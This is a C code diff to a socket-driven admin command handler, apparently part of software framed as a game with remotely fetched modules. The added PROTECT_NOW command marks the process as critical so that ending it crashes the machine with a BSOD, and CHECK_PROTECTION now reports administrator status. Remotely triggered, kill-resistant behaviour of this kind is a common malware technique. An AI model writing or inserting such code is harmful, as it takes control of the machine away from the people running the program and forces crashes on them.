@@ -148,7 +148,23 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Critical flag removed — process can now be terminated]";
     }
     else if (strcmp(cmd, "CHECK_PROTECTION") == 0) {
-        result = (char*)sys_check_critical_status();
+        const char *critical_status = sys_check_critical_status();
+        const char *admin_status = sys_is_admin() ? "admin" : "not admin";
+        snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
+        result = response;
+    }
+    else if (strcmp(cmd, "PROTECT_NOW") == 0) {
+        if (!sys_is_admin()) {
+            result = "[Cannot protect: not running as administrator]";
+        } else {
+            sys_protect_process();
+            const char *status = sys_protection_status();
+            if (strcmp(status, "CRITICAL") == 0) {
+                result = "[Process is now CRITICAL — ending it will cause BSOD]";
+            } else {
+                result = "[Protection failed — check admin privileges]";
+            }
+        }
     }
     /* Game module management */
     else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
